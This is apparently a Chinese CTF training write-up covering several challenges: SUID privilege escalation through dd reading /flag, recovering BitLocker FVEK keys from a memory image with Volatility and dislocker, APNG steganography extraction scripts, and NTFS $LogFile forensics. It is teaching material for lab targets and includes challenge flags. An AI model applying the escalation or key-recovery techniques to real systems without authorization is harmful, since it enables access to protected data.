--- 命令执行中... ---
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/dd
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/mount
shell> dd if=/flag
--- 命令执行中... ---
0xGame{BasE64_Dec0der_w1th_DD}
shell> 

```

> 关于 suid 提权常见的命令，这里有个汇总网站，请大家自行探索https://gtfobins.github.io/gtfobins/
>
> 建议见过一次就掌握一次，我们后面学习渗透时候，提权经常会用到

### Bitlocker 安全吗？

本题主要是考察了内存取证，先简述一下理论依据，我们进行 BitLocker 磁盘解密后（就是说 BitLocker 保护的磁盘正在被使用时），那么解密密钥的某些形式就必须存在于`计算机的易失性内存（RAM）`中

> 下面的部分原理来自 Gemini 老师

#### BitLocker 密钥体系

BitLocker 加密通常涉及至少三个主要的密钥层级：

- **全卷加密密钥 (Full Volume Encryption Key, FVEK):** 这是直接用于加密和解密磁盘上数据的密钥。
- **卷主密钥 (Volume Master Key, VMK):** FVEK 是由 VMK 加密的。加密后的 FVEK 存储在 BitLocker 磁盘的元数据中。
- **保护器 (Protectors):** VMK 是由一个或多个“保护器”加密的。保护器可以是用户的密码、TPM（可信平台模块）、恢复密钥 (Recovery Key) 或启动 PIN 等。加密后的 VMK 也存储在磁盘元数据中。

#### 密钥解密加载过程

当 BitLocker 保护的磁盘需要被访问（即解锁）时，系统会进行以下步骤：

1. 用户提供密码、PIN 或 TPM 验证通过（使用某个保护器）。
2. 保护器用于解密存储在磁盘元数据中的 **VMK**，得到**明文 VMK**。
3. **明文 VMK** 用于解密存储在磁盘元数据中的 **FVEK**，得到**明文 FVEK**。
4. **明文 FVEK**（或用于数据加解密的更低级别的子密钥）会被加载到计算机的**内存（RAM）**中，供磁盘驱动程序实时进行数据的加密和解密操作。

> 这里就要关注了，一旦获取了内存镜像，是有办法恢复 FVEK 的

因此，本题的常规解法是使用 Volatility 进行内存取证，**直接提取出 FVEK**。这是因为 FVEK 是直接用于磁盘加解密的密钥，一旦获取，就可以绕过磁盘元数据中的 VMK 和保护器，直接使用 `dislocker` 等工具对加密磁盘进行解密。"

推荐这两个插件仓库，上面是 vol3 的，下面是 vol2 的，仓库里都有详细使用方法，自己看看

```plain
https://github.com/lorelyai/volatility3-bitlocker
https://github.com/breppo/Volatility-BitLocker
```



#### how to solve(以 vol2 为例)

```bash
~$ python vol.py -f ~/Desktop/timu/0xGame/memdump.mem imageinfo
Volatility Foundation Volatility Framework 2.6.1
INFO    : volatility.debug    : Determining profile based on KDBG search...
          Suggested Profile(s) : Win10x64_10240_17770, Win10x64
                     AS Layer1 : SkipDuplicatesAMD64PagedMemory (Kernel AS)
                     AS Layer2 : FileAddressSpace (/home/yolo/Desktop/timu/0xGame/memdump.mem)
                      PAE type : No PAE
                           DTB : 0x1aa000L
                          KDBG : 0xf802b938bb20L
          Number of Processors : 2
     Image Type (Service Pack) : 0
                KPCR for CPU 0 : 0xfffff802b93e5000L
                KPCR for CPU 1 : 0xffffd00040e75000L
             KUSER_SHARED_DATA : 0xfffff78000000000L
           Image date and time : 2025-08-04 06:32:18 UTC+0000
     Image local date and time : 2025-08-04 14:32:18 +0800
```

`imageinfo`命令是 vol2 最常用的插件之一，可以帮助我们识别内存镜像文件的基本信息，大致原理是该插件会扫描内存 dump 中的关键结构（如 KDBG），并会给我们给出一个或多个 profile，Windows 还好，profile 就那么几种，Linux 的话，有的题还需要我们自己制作 profile，想学习的话，参考去年 nctf 的**谁动了我的 mc**，考察了 Linux 的内存取证

接下来的命令中，我们需要添加参数`--profile=<profile>`去运行其他 vol 插件

> 大家可以理解 profile 是一个系统的字典
>
> 本质上，它是特定操作系统内核的数据结构定义和符号表信息的集合
>
> 核心作用：
>
> - 定位关键数据
> - 正确解析数据
> - 匹配操作系统
>
> 进行取证分析的时候，必须指定合适的 profile，不同操作系统的配置差异很大

```bash
~$ mkdir -p ~/Desktop/timu/dislockerkeys
```

这个命令是创建了一个文件夹

是为下一条命令查到密钥后保存对应密钥文件用的

```bash
~$ python vol.py -f ~/Desktop/timu/0xGame/memdump.mem --profile=Win10x64 bitlocker --dislocker ~/Desktop/timu/dislockerkeys
Volatility Foundation Volatility Framework 2.6.1

[FVEK] Address : 0xe0008763dd60
[FVEK] Cipher  : AES 256-bit (Win 8+)
[FVEK] FVEK: 3d5066272ffd39729d213cbcf989c9a13bf189c9e3e3f48a4c65b82ec4b12750
[DISL] FVEK for Dislocker dumped to file: /home/yolo/Desktop/timu/dislockerkeys/0xe0008763dd60-Dislocker.fvek



[FVEK] Address : 0xe00089569000
[FVEK] Cipher  : AES 256-bit (Win 8+)
[FVEK] FVEK: 0000000000000000000000000000000000000000000000000000000000000000
[DISL] FVEK for Dislocker dumped to file: /home/yolo/Desktop/timu/dislockerkeys/0xe00089569000-Dislocker.fvek



[FVEK] Address : 0xe00089569d60
[FVEK] Cipher  : AES 256-bit (Win 8+)
[FVEK] FVEK: 0000000000000000000000000000000000000000000000000000000000000000
[DISL] FVEK for Dislocker dumped to file: /home/yolo/Desktop/timu/dislockerkeys/0xe00089569d60-Dislocker.fvek



[FVEK] Address : 0xe000899f7680
[FVEK] Cipher  : AES 128-bit (Win 8+)
[FVEK] FVEK: a7b78f9c9e746105a3716704890c3dbf
[DISL] FVEK for Dislocker dumped to file: /home/yolo/Desktop/timu/dislockerkeys/0xe000899f7680-Dislocker.fvek



[FVEK] Address : 0xe00089b5ad60
[FVEK] Cipher  : AES 128-bit (Win 8+)
[FVEK] FVEK: a7b78f9c9e746105a3716704890c3dbf
[DISL] FVEK for Dislocker dumped to file: /home/yolo/Desktop/timu/dislockerkeys/0xe00089b5ad60-Dislocker.fvek
```

存在内存里的 fvek 是二进制文件喔，用插件运行出来的结果看上去是十六进制明文，实质上仅仅截取了部分 fvek 信息，用来区分用的，我们后面要用的是保存在 dislockerkeys 下的 fvek 文件

![image-20251015184612011](/img/0xgame2025/image-20251015184612011.png)

仔细观察上面的 vol 命令的输出，会发现这里不同地址提取出来的密钥不同,然后再仔细观察，发现出现几个 0000 的 fvek，这种就是无效，主要原因是插件会帮助我们将所有可能的 fvek 提取出来，接下来就需要我们进行尝试，把正确的 fvek 找出来

但在此之前，我们先普及个小知识点

```bash
~$ fdisk -l ~/Desktop/timu/0xGame/0xGame.dd
Disk /home/yolo/Desktop/timu/0xGame/0xGame.dd: 100 MiB, 104857600 bytes, 204800 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: dos
Disk identifier: 0x257160c5

Device                                    Boot Start    End Sectors Size Id Type
/home/yolo/Desktop/timu/0xGame/0xGame.dd1        128 198783  198656  97M  7 HPFS/NTFS/exFAT
```

研究过我 week1 出的 do_not_enter，应该要学到，一个 dd 镜像里面会有多个分区，比如本题，我在打镜像的时候，是完整的磁盘镜像，里面甚至包含分区表，然后 BitLocker 加密的是几个分区中的其中一个

简单说说上面 fdisk 命令的结果，我们看到了，dd 镜像中，每个扇区是 512 字节，然后看到磁盘中只有一个存储文件的设备，也就是我们要进行解密的分区了，会看到它是从 128 扇区开始的，然后算一下，`128*512=65536byte`，也就是说，有 BitLocker 加密的分区在整个镜像的偏移为 65536byte，后面我们解密的时候需要指定起点

```bash
~$ sudo mkdir -p /mnt/dislocker_tmp
~$ sudo mkdir -p /mnt/decrypted
```

这里一次性创建两个挂载文件夹

- 第一个是`dislocker`的输出卷
- - `dislocker`会在这个目录下创建一个名为`dislocker-file`的特殊文件（或者叫它设备）
  - 这个`dislocker-file`是一个虚拟的 NTFS 卷。它的作用是：`dislocker`在后台实时地对加密数据进行解密，并将解密后的数据流以 NTFS 文件系统形式呈现给操作系统
- 第二个是`NTFS`挂载卷
- - 由于`dislocker-file`本质上是一个标准的 NTFS 文件系统卷，需要使用标准的 mount 命令（通常是`mount -o loop`或`mount -o ro`）将其作为文件系统挂载到第二个目标文件夹中，完成这一步后，我们就可以正常的在第二个文件夹中访问加密磁盘内部的文件内容

> 小汇总：可以理解成第一个文件夹是加密 dd 镜像解密时候用的，里面的内容是给系统看的，我们不能直接读，但是它给了一个输出，我们把这个输出导入到另一个文件夹中，这会儿我们就能正常读取了

```bash
~$ sudo dislocker -v --offset 65536 -k /home/yolo/Desktop/timu/dislockerkeys/0xe00089b5ad60-Dislocker.fvek -- ~/Desktop/timu/0xGame/0xGame.dd /mnt/dislocker_tmp
~$ sudo ls /mnt/dislocker_tmp/
dislocker-file
```

这个命令很重要，是解密 BitLocker 必用的，里面部分细节给大家解释过了，-v 是要求结果详细输出，比如说哪里出问题了，还能通过报错进行修复，--offset 是指定偏移，就要我们把上面计算的结果写上，-k 是指定的我们用 vol 提取的 fvek 文件，--是很推荐的分隔符，它告诉 dislocker 后面跟着的参数不是选项，而是输入文件（加密卷）和输出挂载点

运行结束后，会看到输出文件夹下出现了`dislocker-file`，就是上面说的 ntfs 卷（已经解密好了的，感觉可以等价成没有被加密的磁盘

```bash
~$ sudo mount -o loop,ro -t ntfs-3g /mnt/dislocker_tmp/dislocker-file /mnt/d
ecrypted
```

这是很常见的磁盘挂载命令了

- mount 是系统的挂载命令
- -o loop 是指定我们后面挂载的源是一个文件，而不是一个物理块设备，系统会自动创建一个虚拟块设备，将这个文件视为一个磁盘分区
- -o ro 这个是只读选项，我们只能读取加密卷，不做编辑，所以这个还是蛮有必要的，后面我们进行取证的时候，如果不慎将文件编辑（也许正好是我们重要的文件呢？），还没有备份，这个题就寄了
- -t ntfs-3g 这是因为我们上面使用 fdisk 查看镜像的时候，读取到的

```text
Device                                    Boot Start    End Sectors Size Id Type
/home/yolo/Desktop/timu/0xGame/0xGame.dd1        128 198783  198656  97M  7 HPFS/NTFS/exFAT
```

后面两个就是 dislocker-file 和挂载点了，不细说了

我猜大家会问，我们要如何判断某个 fvek 是正确的呢？

很简单，上面这个命令失败了，就是没解密成功

![image-20251015194637451](/img/0xgame2025/image-20251015194637451.png)

简单说下报错信息，NTFS 签名缺失，挂载失败，这个需要挂载的东西不是一个有效的 NTFS，差不多就这样，然后我们就该换其他的尝试了，仔细观察下，你们应该会看出来，就两个 fvek 需要尝试吧，第一个我们已经尝试失败了，然后全是 0 的那个没有必要尝试，只剩下最后两个，但是它两其实是一个东西，看显示的十六进制部分就能看出来了

```bash
~$ ls /mnt/decrypted
'$RECYCLE.BIN'  'System Volume Information'   flag.txt
~$ cat /mnt/decrypted/flag.txt
0xGame{Wow_Y0u_@r3_BEsT_H@cker!!!_Coom3_0n!!!}
```

挂载好后，读取 flag 即可



##### vol3 命令展示

> 里面部分文件路径我给简化了，大概看看过程就好了

```bash
yolo@yolo:~$ python vol.py -f memdump.mem -vvv windows.bitlocker.BitlockerFVEKScan --tags FVEc Cngb None --dislocker
yolo@yolo:~$ sudo mkdir -p /mnt/dislocker_tmp
yolo@yolo:~$ sudo mkdir -p /mnt/decrypted
yolo@yolo:~$ sudo dislocker -v --offset 65536 -k 0xe000899f7680-Dislocker.fvek -- 0xGame.dd /mnt/dislocker_tmp
yolo@yolo:~$ sudo mount -o loop,ro -t ntfs-3g /mnt/dislocker_tmp/dislocker-file /mnt/decrypted
yolo@yolo:~$ ls /mnt/decrypted
'$RECYCLE.BIN'  'System Volume Information'   flag.txt
yolo@yolo:~$ cat /mnt/decrypted/flag.txt
0xGame{Wow_Y0u_@r3_BEsT_H@cker!!!_Coom3_0n!!!}
yolo@yolo:~$ sudo umount /mnt/decrypted
yolo@yolo:~$ sudo umount /mnt/dislocker_tmp
yolo@yolo:~$ sudo rmdir /mnt/dislocker_tmp
yolo@yolo:~$ sudo rmdir /mnt/decrypted
```

##### passware kit forensic 展示

> 这真的是一把梭，所以还是希望学弟学妹掌握了上面用 vol 手动提取后，再使用这个（至少通过内存解密 BitLocker 的原理得说得上一二吧

<img src="/img/0xgame2025/image-20251012232754704.png" alt="image-20251012232754704" style="zoom:50%;" />





### A cute dog

本题确实是个难题（但是考点并不难

`Apng`，这个格式的图片可以说是 gif 的下一代

那么 gif 的相关考点也能用到 Apng 上，同时，Apng 也可以看作 png，一些 png 有关的考点也能用到里面，最后我索性再套了个娃，使用 oursecret 对整个文件进行了隐写，感觉前后逻辑还算清晰吧

#### Apng 格式简单梳理

https://lastnigtic.cn/posts/apng-editor/

上面链接介绍的很清晰很清晰，下面就针对题目可能用到的知识简单说说

把它当作 png 图片处理没有太大的问题，它新增了几个数据块，关注下 fcTL 块，可以控制帧间混合效果，是直接覆盖还是部分覆盖，偏移量和延时等信息

- sequence_number 帧序号
- width 宽度
- height 高度
- x_offset 此帧数据 x 轴偏移量
- y_offset 此帧数据 y 轴偏移量
- delay_num 间隔分子
- delay_den 间隔分母
- dispose_op 在显示该帧之前，需要对前面缓冲输出区域做何种处理。
- blend_op 帧渲染类型

然后本题第一步考点是时间轴隐写

<img src="/img/0xgame2025/image-20251015202310826.png" alt="image-20251015202310826" style="zoom:50%;" />

很清楚吧，这里的 delay_num 就是动画延时时间，我们直接用脚本提取，脚本逻辑很好懂吧，只要熟悉 png 的数据结构就能处理了呢，不熟悉数据块组成的，来这里看（4+4+len(长度)+4），懂我意思不？

<img src="/img/0xgame2025/image-20251015205305380.png" alt="image-20251015205305380" style="zoom:50%;" />

```python
import struct

def extract_apng_Delay_num(apng_file_path):
	delay_numbers=[]
	try:
		with open(apng_file_path,'rb') as f:
			f.read(8)
			while True:
				length_bytes=f.read(4)
				if not length_bytes:
					break

				chunk_length=struct.unpack('>I',length_bytes)[0]
				chunk_type_bytes=f.read(4)
				chunk_type=chunk_type_bytes.decode('ascii')

				if chunk_type=='fcTL':
					if chunk_length!=26:
						print("wrong fctl chunk")
						f.read(chunk_length)

					else:
						chunk_data=f.read(chunk_length)
						delay_num=struct.unpack('>H',chunk_data[20:22])[0]
						delay_numbers.append(delay_num)
					f.read(4)
				elif chunk_type=='IEND':
					break

				else:
					f.read(chunk_length)
					f.read(4)
	except FileNotFoundError:
		print(f"file can not found")
		return

	print("extracted delay num")
	print(delay_numbers)
	print("-"*30)

	ascii_result=""
	for num in delay_numbers:
		if 32<=num<=126:
			ascii_result+=chr(num)
		else:
			pass
	print(f"ascii decoded:{ascii_result}")

if __name__=="__main__":
	file='a_cute_dog.png'
	extract_apng_Delay_num(file)
"""
extracted delay num
[116, 104, 101, 95, 50, 52, 116, 104, 95, 109, 97, 121, 98, 101, 95, 117, 115, 101, 102, 117, 108, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10]
------------------------------
ascii decoded:the_24th_maybe_useful

"""

```

可以读出，隐写信息是第 24 个图片有点东西，那就想办法恢复出来，python 有个 apng 库，还是挺厉害的

```python
import os
from apng import APNG

def extract_apng_frames(apng_file_path,output_dir="frames_output"):
	if not os.path.exists(output_dir):
		os.makedirs(output_dir)
		print(f"create output dir")
	try:
		im=APNG.open(apng_file_path)
	except Exception as e:
		print("wrong,can not open file")
		return
	print("successfully load file")

	for i,(png_instance,control_instance) in enumerate(im.frames):
		frame_filename=f"frame_{i:03d}.png"
		output_path=os.path.join(output_dir,frame_filename)
		try:
			png_instance.save(output_path)
			print(f"save {i}:{output_path}")
		except Exception as e:
			print(f"can not save{i}")
			continue

	print(f"all saved in {output_dir}")
if __name__ =="__main__":
	input_file='a_cute_dog.png'
	output_folder='dog_frames'
	extract_apng_frames(input_file,output_folder)
```

恢复出来后，直接分析 frame_023.png（懵逼了吧，为啥我不分析 024？因为整个 apng 逐帧提取出来的 png 是从 0 开始的

<img src="/img/0xgame2025/image-20251015214136483.png" alt="image-20251015214136483" style="zoom:50%;" />

单纯考察了 LSB 隐写，发现这里隐写了一个压缩包，但是会发现压缩包完全是倒着隐写进去的，需要我们处理下，细节大家自己观察，我这里给出解决方案：直接点击 save bin，将整个 lsb 隐写的二进制信息提取出来，补充，那个 save text 是将预览右侧的可读字符给保存出来了

<img src="/img/0xgame2025/image-20251015214623565.png" alt="image-20251015214623565" style="zoom:50%;" />

注意这里，箭头标注的地方才是压缩包头

<img src="/img/0xgame2025/image-20251015214906015.png" alt="image-20251015214906015" style="zoom:50%;" />

我这里形容下，我要隐藏 123，就按照 321 的顺序隐藏进去的，然后呢，50 这样的是一个字节，不能变成 05，选中后`ctrl+shift+c`复制，然后新建一个文件，`ctrl+shift+v`粘贴

接下来就是用一个很简单很简单的 python 进行倒序输出文件即可

<img src="/img/0xgame2025/image-20251015220059700.png" alt="image-20251015220059700" style="zoom:50%;" />

拿到了第一部分 flag

```text
Congratulations!!!( •̀ ω •́ )y
the gifts are these:

1.0xGame{Y0u_nn@stered_LSb_And_y0
2.the next challenge is in oursecret
3.the key is flag_part1
```

第二部分我感觉我说的很清楚了，需要用到`oursecret`工具，然后密码是第一部分 flag，然后文件的话，自然是题目下发的那个附件啊

> 确实，这里算是本题的一个败笔，我的初衷是想设计一个不用任何工具的 misc 题目，但是这是我之前出的题了，现改不能保证出好（不过不要喷我啊，这种有隐写工具的题目才算是那种很常见的 misc 题呢

<img src="/img/0xgame2025/image-20251015220444898.png" alt="image-20251015220444898" style="zoom:50%;" />

将 part2.zip 解压后，拿到的图片用 010 看，会发现 crc 报错，这里就考察了 crc 宽高爆破，关于爆破原理，请去参考我的[博客](https://yo1o.top/2025/04/13/png-challenge/)

<img src="/img/0xgame2025/image-20251015220712663.png" alt="image-20251015220712663" style="zoom:50%;" />

然后宽高修改，我也在 week2 上讲过，需要修改 IHDR 块的部分内容，高度改 800 就能拿到第二部分 flag

<img src="/img/0xgame2025/image-20251015221030965.png" alt="image-20251015221030965" style="zoom:50%;" />

## Week4

### NTFS 很 ez 啦

本题考察 ntfs 日志分析（题外话：在学习应急响应等取证比赛中，必须熟悉 Windows 注册表，日志分析，Linux 也要学，本题算是个引子，希望大家能更快入门实战，掌握过硬本领

考虑到大家是第一次碰应急响应，给大家提供足够的 hint 了，首先我们需要关注日志，然后关注一些文件名的变化

然后在一个 NTFS 盘中，记录日志的文件叫做$LogFile，它的作用很多很多

#### $LogFile 记录的日志类型

记录的元数据操作：

- ✅ **文件创建/删除**
- ✅ **文件重命名**
- ✅ **权限变更**
- ✅ **文件大小变化**
- ✅ **目录结构修改**
- ❌ **文件实际内容**（不记录）

可以理解我为啥说它很重要了吧，在实战中，要是想检测 hacker 在哪里写了🐎，通过这个 logfile 还是有可能找到的，而且它几乎无法被篡改（篡改难度很大，只有 SYSTEM 权限（最高权限）才能写，要绕过文件系统驱动，还要满足处理事务一致性检查

#### how to solve

回到本题，有多种方式提取$LogFile，我举两个例子

第一个是使用 autopsy

<img src="/img/0xgame2025/image-20251016130518222.png" alt="image-20251016130518222" style="zoom:50%;" />

挂载好后，直接提取即可

第二个方法是用 7z 直接打开 vhd

<img src="/img/0xgame2025/image-20251016130625300.png" alt="image-20251016130625300" style="zoom:50%;" />

注意，一定要找到正确的路径

提取出来后，会发现它是二进制文件，我们需要找到合适的平台或工具挂载

推荐这个项目https://github.com/jschicht/LogFileParser

<img src="/img/0xgame2025/image-20251016132706035.png" alt="image-20251016132706035" style="zoom:50%;" />

运行完后，会在工具路径下得到一堆 csv 文件以及完整的日志数据库文件

<img src="/img/0xgame2025/image-20251016132852517.png" alt="image-20251016132852517" style="zoom:50%;" />

这是那个记录 FileNames 的 csv，其实已经可以看到部分关键信息了，但是对此还有怀疑，因为工具并没有帮助我们输出前后文件名变化，接下来直接分析那个 db 数据库，里面记录的东西更多，而且更好分析日志

```bash
yolo@yolo:~/Desktop/timu$ sqlite3 ntfs.db
SQLite version 3.45.1 2024-01-30 16:01:20
Enter ".help" for usage hints.
sqlite> .tables
IndexEntries  LogFile
sqlite> .schema LogFile
CREATE TABLE LogFile (lf_Offset TEXT,lf_MFTReference INTEGER,lf_MftHdr_Seq INTEGER,lf_MftHdr_Lsn INTEGER,lf_MftHdr_Flags TEXT,lf_RealMFTReference INTEGER,lf_MFTBaseRecRef INTEGER,lf_LSN INTEGER,lf_LSNPrevious INTEGER,lf_RedoOperation TEXT,lf_UndoOperation TEXT,lf_OffsetInMft INTEGER,lf_FileName TEXT,lf_CurrentAttribute TEXT,lf_TextInformation TEXT,lf_UsnJrlFileName TEXT,lf_UsnJrlMFTReference INTEGER,lf_UsnJrlMFTParentReference INTEGER,lf_UsnJrlTimestamp TEXT,lf_UsnJrlReason TEXT,lf_UsnJrnlUsn INTEGER,lf_SI_CTime TEXT,lf_SI_ATime TEXT,lf_SI_MTime TEXT,lf_SI_RTime TEXT,lf_SI_FilePermission TEXT,lf_SI_MaxVersions INTEGER,lf_SI_VersionNumber INTEGER,lf_SI_ClassID INTEGER,lf_SI_SecurityID INTEGER,lf_SI_QuotaCharged INTEGER,lf_SI_USN INTEGER,lf_SI_PartialValue TEXT,lf_FN_CTime TEXT,lf_FN_ATime TEXT,lf_FN_MTime TEXT,lf_FN_RTime TEXT,lf_FN_AllocSize INTEGER,lf_FN_RealSize INTEGER,lf_FN_Flags TEXT,lf_FN_Namespace TEXT,lf_DT_StartVCN INTEGER,lf_DT_LastVCN INTEGER,lf_DT_ComprUnitSize INTEGER,lf_DT_AllocSize INTEGER,lf_DT_RealSize INTEGER,lf_DT_InitStreamSize INTEGER,lf_DT_DataRuns TEXT,lf_DT_Name TEXT,lf_FileNameModified INTEGER,lf_RedoChunkSize INTEGER,lf_UndoChunkSize INTEGER,lf_client_index INTEGER,lf_record_type INTEGER,lf_transaction_id INTEGER,lf_flags INTEGER,lf_target_attribute INTEGER,lf_lcns_to_follow INTEGER,lf_attribute_offset INTEGER,lf_MftClusterIndex INTEGER,lf_target_vcn INTEGER,lf_target_lcn INTEGER,InOpenAttributeTable INTEGER,FromRcrdSlack INTEGER,IncompleteTransaction INTEGER);
sqlite> 
```

> 命令解释

db 是一种数据库文件，一般来说，我们用 sqlite3 工具打开进行分析

`.tables`命令可以帮助我们将数据库下面的表单列出来

`.schema <表单>`可以帮助我们将表单中所有的项目字段罗列出来（举例，就像 excel 表格头信息那样

##### 就 LogFile 表字段分类进行解析

- 基础标识字段

```text
lf_Offset TEXT,                    -- 记录在$LogFile中的物理偏移地址
lf_MFTReference INTEGER,           -- MFT记录号（文件ID）
lf_MftHdr_Seq INTEGER,             -- MFT序列号（防重用）
lf_MftHdr_Lsn INTEGER,             -- MFT头中的LSN
lf_MftHdr_Flags TEXT,              -- MFT记录标志（IN_USE等）
```



- 事务和操作跟踪

```text
lf_LSN INTEGER,                    -- 日志序列号（操作顺序）
lf_LSNPrevious INTEGER,            -- 前一个LSN（事务链）
lf_RedoOperation TEXT,             -- 重做操作描述
lf_UndoOperation TEXT,             -- 撤销操作描述  
lf_client_index INTEGER,           -- 客户端索引（哪个组件执行操作）
lf_record_type INTEGER,            -- 记录类型
lf_transaction_id INTEGER,         -- 事务ID
```



- 文件名相关

```text
lf_FileName TEXT,                  -- 文件名！！！（这是你要找的）
lf_FileNameModified INTEGER,       -- 文件名是否被修改的标志
lf_UsnJrlMFTReference INTEGER,     -- USN日志中的MFT引用
lf_UsnJrlMFTParentReference INTEGER, -- USN日志中的父目录MFT引用
lf_UsnJrlFileName TEXT,           -- USN日志中记录的文件名
lf_UsnJrlMFTReference INTEGER,    -- USN日志中的MFT引用号
lf_UsnJrlMFTParentReference INTEGER, -- USN日志中父目录的MFT引用号
lf_UsnJrlTimestamp TEXT,          -- USN日志记录的时间戳（重要！）
lf_UsnJrlReason TEXT,             -- USN变更原因（如创建、删除、重命名等）
lf_UsnJrnlUsn INTEGER,            -- USN序列号
```



- 时间戳信息

```text
lf_SI_CTime TEXT,                  -- 标准信息创建时间
lf_SI_ATime TEXT,                  -- 标准信息访问时间  
lf_SI_MTime TEXT,                  -- 标准信息修改时间
lf_SI_RTime TEXT,                  -- 标准信息MFT记录时间
lf_FN_CTime TEXT,                  -- 文件名信息创建时间
lf_FN_ATime TEXT,                  -- 文件名信息访问时间
lf_FN_MTime TEXT,                  -- 文件名信息修改时间
lf_FN_RTime TEXT,                  -- 文件名信息MFT记录时间
```



- 文件属性和数据

```text
lf_FN_AllocSize INTEGER,           -- 分配大小
lf_FN_RealSize INTEGER,            -- 实际大小
lf_FN_Flags TEXT,                  -- 文件属性（存档、隐藏等）
lf_FN_Namespace TEXT,              -- 文件名命名空间
lf_DT_DataRuns TEXT,               -- 数据运行列表（文件内容位置）
lf_DT_RealSize INTEGER,            -- 数据属性实际大小
```

- 数据属性相关字段

```text
lf_DT_StartVCN INTEGER,           -- 数据属性起始虚拟簇号
lf_DT_LastVCN INTEGER,            -- 数据属性最后虚拟簇号  
lf_DT_ComprUnitSize INTEGER,      -- 压缩单元大小
lf_DT_AllocSize INTEGER,          -- 数据属性分配大小
lf_DT_RealSize INTEGER,           -- 数据属性实际大小
lf_DT_InitStreamSize INTEGER,     -- 初始流大小
lf_DT_DataRuns TEXT,              -- 数据运行列表（文件物理位置）
lf_DT_Name TEXT,                  -- 数据属性名称
```

- 事务和恢复相关

```text
lf_RealMFTReference INTEGER,      -- 实际的MFT引用号
lf_MFTBaseRecRef INTEGER,         -- MFT基础记录引用
lf_OffsetInMft INTEGER,           -- 在MFT记录中的偏移量
lf_CurrentAttribute TEXT,         -- 当前操作的属性类型
lf_TextInformation TEXT,          -- 文本信息（可能包含文件内容片段）
lf_RedoChunkSize INTEGER,         -- 重做操作数据块大小
lf_UndoChunkSize INTEGER,         -- 撤销操作数据块大小
```



- 标志和状态字段

```text
lf_flags INTEGER,                 -- 记录标志位
lf_target_attribute INTEGER,      -- 目标属性类型
lf_lcns_to_follow INTEGER,        -- 要跟随的LCN数量
lf_attribute_offset INTEGER,      -- 属性偏移量
lf_MftClusterIndex INTEGER,       -- MFT簇索引
lf_target_vcn INTEGER,            -- 目标虚拟簇号
lf_target_lcn INTEGER,            -- 目标逻辑簇号
InOpenAttributeTable INTEGER,     -- 是否在打开属性表中
FromRcrdSlack INTEGER,            -- 是否来自记录slack空间
IncompleteTransaction INTEGER     -- 是否是不完整事务
```

上面的信息不用全部记下，给详细说几个下面命令要用的

```text
lf_UsnJrlTimestamp, lf_UsnJrlReason, lf_FileName,lf_UsnJrlReason,lf_LSN
```

- lf_LSN 日志序列号，是日志记录中，文件操作的绝对时间顺序，值越大显得文件越新
- lf_FileName 日志记录的文件名，重命名前后的文件名都有，它实时更新的，所以说之前的文件名和之后的文件名都会被记录的
- lf_UsnJrlFileNameUSN 日志中的文件名，这个 USN 是单独的一个记录文件操作的小日志板块
- lf_UsnJrlTimestampUSN 日志时间戳，记录文件操作时候的时间信息
- lf_UsnJrlReasonUSN 变更原因，这会记录文件操作的事件，比如说文件创建，删除，重命名，文件关闭，数据扩展等等

<img src="/img/0xgame2025/image-20251016135205570.png" alt="image-20251016135205570" style="zoom:50%;" />

```sql
SELECT lf_UsnJrlTimestamp, lf_UsnJrlReason, lf_FileName FROM LogFile WHERE lf_UsnJrlReason LIKE '%RENAME%' ORDER BY lf_LSN;
```

这是 SQL 语句，学弟学妹们需要自学，我这里解释下它

`SELECT lf_UsnJrlTimestamp, lf_UsnJrlReason, lf_FileName`

是说只显示这三个部分，分别是操作发生的时间，操作类型，涉及的文件名

`FROM LogFile`指定了数据源，就是我们上面`.tables`的结果

`WHERE lf_UsnJrlReason LIKE '%RENAME%'`

这里增加了过滤条件，需要那个变更原因进行模糊匹配 RENAME

`ORDER BY lf_LSN;`

对输出结果进行排序，按照日志序列号排序，可以确保正确的顺序

在返回结果中，我们发现重命名操作是从数字.txt 到字母.dat，可以想到，这里面我隐写了 flag

然后从数字转换字节，python 一个 num.to_bytes 就好了吧

```python
def num_to_string(num):
	num_bytes=(num.bit_length()+7)//8 #这是由于num.to_bytes需要指定字节长度，所以我这样写的，会自动向上取整，确保转换出来的字节完整
	byte_data=num.to_bytes(num_bytes,'big')
	return byte_data.decode('utf-8',errors='ignore')
numbers=[
	13643046854681979,
    6426765720352224837,
    6876554908428166514,
    28539333146592819,
    555819389
]
flag_parts=[num_to_string(n) for n in numbers]
flag=''.join(flag_parts)
print(f"{flag}")
"""
0xGame{Y0u_H@vE_nnAsTered_NTF3!!!}
"""
```

### ezHack

> Yolo 好久之前打的一个渗透，提权的时候遇到的，感觉不错，就写了个 docker 给大家玩
>
> 因为提权方式很多很杂，所以这个授课我选择边打边讲，然后提权手段也是直接说清楚怎么提权，中间的尝试部分就不为大家赘叙了

<img src="/img/0xgame2025/image-20251016201003697.png" alt="image-20251016201003697" style="zoom:50%;" />

ssh 靶机连接我不详述了，忘记了回去看 week1

连接上后,随便输入命令

```bash
ctf@dep-1f31e3dc-af66-4648-afb6-1b7bad80dc22-69cd6d55bf-trqhl:~$ ls
hello.txt
ctf@dep-1f31e3dc-af66-4648-afb6-1b7bad80dc22-69cd6d55bf-trqhl:~$ cat hello.txt
hello ,you can be better hacker.
 The flag is in /root/
ctf@dep-1f31e3dc-af66-4648-afb6-1b7bad80dc22-69cd6d55bf-trqhl:~$ ls /root
ls: cannot open directory '/root': Permission denied
ctf@dep-1f31e3dc-af66-4648-afb6-1b7bad80dc22-69cd6d55bf-trqhl:~$
```

会发现当前是 ctf 用户，然后家目录中有个 hello.txt,告诉我们，flag 在/root/下面，但是我们需要先想办法提权

> 当前模拟渗透场景是，我们通过前面的 http 服务漏洞或其他 ssh,smb 服务等等,拿到了一个较低权限的用户，然后我们需要想办法通过 root 用户配置不当的漏洞，进行劫持提权操作，渗透的世界还是很大很大，方法也五花八门，我也不能保证拿到一个靶机就能渗透进去提权，所以希望和大家共勉！！！

#### how to root

